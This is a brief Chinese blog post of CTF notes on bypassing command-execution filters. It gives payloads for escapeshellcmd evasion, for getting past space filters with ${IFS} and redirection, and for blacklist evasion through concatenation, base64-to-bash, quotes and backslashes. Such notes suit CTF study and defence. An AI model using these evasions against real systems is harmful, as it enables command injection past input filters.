---
title: CTF中命令执行绕过方法
categories:
  - web
  
abbrlink: 2701
date: 2023.11.23
tags: 
   - php

---

# **命令执行绕过**

## escapeshellcmd函数绕过方法：

1.执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。

payload=

```
post=../ %1a whoami
```

2.宽字节注入

## 空格过滤：

1.${IFS}

payload1=

```
cat${IFS}flag
```

payload2=

```
cat${IFS}$9flag
```

payload3=

```
cat$IFS$9flag
```

2.重定向符<>

payload1=

```
cat<>flag
```

payload2=

```
cat<flag
```

# 黑名单绕过

1.拼接

payload=

```
a=c;b=at;c=flag;$a$b $c
```

2.利用已存在的资源

从已有的文件或者环境变量中获得相应的字符。

3.base64编码

```
`echo "Y2F0IGZsYWc="|base64 -d`
```

```
echo "Y2F0IGZsYWc="|base64 -d|bash
```

4.单引号、双引号

payload1=

```
c""at flag
```

payload2=

```
c""at fl""ag
```

payload3=

```
c""at fl''ag
```

5.反斜线 \

payload=

```
c\at fl\ag
```

6.LINUX下一些已有字符

- ${PS2} 对应字符 '>'
- ${PS4} 对应字符 '+'
- ${IFS} 对应 内部字段分隔符
- ${9} 对应 空字符串



